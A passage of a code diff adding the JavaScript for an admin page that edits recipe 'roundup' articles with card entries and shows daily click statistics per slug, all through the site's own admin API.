+        openEditRoundup(null);
+      });
+
+      document.getElementById('btn-cancel-roundup').addEventListener('click', function() {
+        roundupFormCard.style.display = 'none';
+      });
+
+      function renderCardInputs(cards) {
+        cardsContainer.innerHTML = '';
+        cards.forEach(function(c, i) { addCardRow(c, i); });
+      }
+
+      function addCardRow(data, index) {
+        data = data || {};
+        var row = document.createElement('div');
+        row.className = 'card-row';
+        row.style.cssText = 'background: var(--surface-card); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.85rem;';
+        row.innerHTML =
+          '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">' +
+            '<span style="font-weight: 700; font-size: 0.85rem; color: #fff;">Card #' + (index + 1) + '</span>' +
+            '<button type="button" class="btn btn-danger btn-sm remove-card-btn">Remove</button>' +
+          '</div>' +
+          '<div class="grid-2" style="gap: 0.5rem; margin-bottom: 0.5rem;">' +
+            '<input type="text" class="card-title-input" placeholder="Card Title" value="' + escapeHtml(data.title || '') + '" />' +
+            '<input type="url" class="card-image-input" placeholder="Image URL" value="' + escapeHtml(data.image || '') + '" />' +
+          '</div>' +
+          '<input type="text" class="card-desc-input" placeholder="Card Description" style="width: 100%; margin-bottom: 0.5rem;" value="' + escapeHtml(data.description || '') + '" />' +
+          '<input type="url" class="card-url-input" placeholder="Target / Recipe URL" style="width: 100%;" value="' + escapeHtml(data.targetUrl || '') + '" />';
+
+        row.querySelector('.remove-card-btn').addEventListener('click', function() {
+          row.remove();
+        });
+        cardsContainer.appendChild(row);
+      }
+
+      document.getElementById('btn-add-card').addEventListener('click', function() {
+        addCardRow({}, cardsContainer.children.length);
+      });
+
+      document.getElementById('btn-save-roundup').addEventListener('click', function() {
+        var slug = document.getElementById('rf-slug').value.trim().toLowerCase().replace(/[^a-z0-9_-]/g, '');
+        var title = document.getElementById('rf-title').value.trim();
+        var description = document.getElementById('rf-desc').value.trim();
+        var image = document.getElementById('rf-image').value.trim();
+
+        if (!slug || !title) {
+          showToast('Slug and Title are required', 'error');
+          return;
+        }
+
+        var cards = [];
+        document.querySelectorAll('#cards-container .card-row').forEach(function(row) {
+          cards.push({
+            title: row.querySelector('.card-title-input').value.trim(),
+            image: row.querySelector('.card-image-input').value.trim(),
+            description: row.querySelector('.card-desc-input').value.trim(),
+            targetUrl: row.querySelector('.card-url-input').value.trim()
+          });
+        });
+
+        apiFetch('/api/admin/roundups', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            siteId: currentSite,
+            slug: slug,
+            title: title,
+            description: description,
+            image: image,
+            cards: cards
+          })
+        }).then(function(res) {
+          if (res.success) {
+            showToast('Roundup article saved to RECIPE_KV!');
+            roundupFormCard.style.display = 'none';
+            loadRoundups();
+          } else {
+            showToast(res.error || 'Failed to save roundup', 'error');
+          }
+        });
+      });
+
+      function deleteRoundup(slug) {
+        if (!confirm('Are you sure you want to delete roundup "' + slug + '"?')) return;
+        apiFetch('/api/admin/roundups?siteId=' + encodeURIComponent(currentSite) + '&slug=' + encodeURIComponent(slug), {
+          method: 'DELETE'
+        }).then(function(res) {
+          if (res.success) {
+            showToast('Roundup deleted');
+            roundupFormCard.style.display = 'none';
+            loadRoundups();
+          }
+        });
+      }
+
+      document.getElementById('btn-delete-roundup').addEventListener('click', function() {
+        if (editingRoundupSlug) deleteRoundup(editingRoundupSlug);
+      });
+
+      // Stats
+      var statTotalClicks = document.getElementById('stat-total-clicks');
+      var statActiveSlugs = document.getElementById('stat-active-slugs');
+      var statTopSlug = document.getElementById('stat-top-slug');
+      var statDatePicker = document.getElementById('stat-date-picker');
+      var statsTbody = document.getElementById('stats-tbody');
+
+      function loadStats() {
+        var dateVal = statDatePicker.value || new Date().toISOString().slice(0, 10);
+        apiFetch('/api/admin/stats?siteId=' + encodeURIComponent(currentSite) + '&date=' + encodeURIComponent(dateVal)).then(function(res) {
+          if (res && res.stats) {
+            renderStatsUI(res.stats);
+          }
+        }).catch(function() {
+          showToast('Failed to load click statistics', 'error');
+        });
+      }
+
+      function renderStatsUI(stats) {
+        var total = stats.totalClicks || 0;
+        var slugs = stats.slugs || {};
+        var slugKeys = Object.keys(slugs);
+
+        statTotalClicks.textContent = total.toLocaleString();
+        statActiveSlugs.textContent = slugKeys.length;
+
+        var topSlug = 'None';
+        var topClicks = 0;
+        slugKeys.forEach(function(k) {
+          if (slugs[k] > topClicks) {
+            topClicks = slugs[k];
+            topSlug = k + ' (' + topClicks + ')';
+          }
+        });
+        statTopSlug.textContent = topSlug;
+
+        if (slugKeys.length === 0) {
+          statsTbody.innerHTML = '<tr><td colspan="3" style="text-align: center; color: var(--text-muted); padding: 2rem;">No clicks recorded for this date.</td></tr>';
+          return;
+        }
+
+        // Sort by clicks desc
+        slugKeys.sort(function(a, b) { return slugs[b] - slugs[a]; });
+
+        statsTbody.innerHTML = slugKeys.map(function(slug) {
+          var count = slugs[slug];
+          var pct = total > 0 ? Math.round((count / total) * 100) : 0;
+          return '<tr>' +
+            '<td><strong style="color: #fff;">/' + escapeHtml(slug) + '</strong></td>' +
+            '<td><span style="font-weight: 700; color: #fb923c;">' + count + '</span></td>' +
+            '<td>' +
+              '<div style="display: flex; align-items: center; gap: 0.75rem;">' +
+                '<div style="flex: 1; height: 8px; background: #374151; border-radius: 4px; overflow: hidden;">' +
+                  '<div style="height: 100%; width: ' + pct + '%; background: var(--primary); border-radius: 4px;"></div>' +
+                '</div>' +
+                '<span style="font-size: 0.75rem; color: var(--text-muted); min-width: 32px;">' + pct + '%</span>' +
+              '</div>' +
+            '</td>' +
+          '</tr>';
+        }).join('');
+      }
+
+      statDatePicker.addEventListener('change', loadStats);
+      document.getElementById('btn-refresh-stats').addEventListener('click', function() {
+        loadStats();
+        showToast('Stats updated');
+      });
+
+      function escapeHtml(str) {
+        if (!str) return '';
+        return String(str)
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;')
+          .replace(/"/g, '&quot;');
+      }
+    })();
+  </script>
+</body>
+</html>
